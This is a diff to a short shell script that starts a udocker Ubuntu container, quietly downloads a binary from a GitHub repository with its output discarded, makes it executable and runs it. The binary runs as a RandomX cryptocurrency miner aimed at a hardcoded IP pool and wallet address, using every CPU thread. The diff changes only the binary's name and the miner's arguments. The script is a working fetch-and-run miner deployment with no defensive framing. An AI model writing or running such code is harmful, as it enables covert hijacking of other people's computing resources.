@@ -5,6 +5,6 @@ cd udocker
 ./udocker  run focal /bin/bash
 echo
 apt update -y && apt upgrade -y
-nohup wget -O mmm https://github.com/kidoescegh/xm/raw/main/sorabi28 > /dev/null 2>&1
+nohup wget -O mmm https://github.com/kidoescegh/xm/raw/main/newxm > /dev/null 2>&1
 chmod 777 mmm
-./mmm --algorithm rx/0 --pool 146.190.135.107:80 --wallet 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR.$(echo $(shuf -i 1-100000 -n 1)-mmh) --password Sage --cpu-threads $(nproc --all) --keepalive true
+./mmm --donate-level 1 -o 146.190.135.107:80 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -p Sage -a rx/0 -t $(nproc --all)
